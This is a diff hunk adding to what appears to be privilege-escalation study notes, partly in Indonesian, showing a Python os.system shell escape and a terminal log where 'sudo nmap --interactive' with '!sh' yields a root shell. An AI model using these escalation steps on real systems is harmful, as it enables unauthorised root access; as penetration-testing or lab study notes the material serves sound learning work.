@@ -33,3 +33,16 @@ sekarang tinggal akses bash begini: bash -p
     0
     >>> 
     >>> os.system('/bin/bash')
+
+# nmap suid 
+
+    bash-3.2$ sudo nmap --interactive
+    sudo nmap --interactive
+
+    Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
+    Welcome to Interactive Mode -- press h <enter> for help
+    nmap> !sh
+    !sh
+    sh-3.2# id
+    id
+    uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
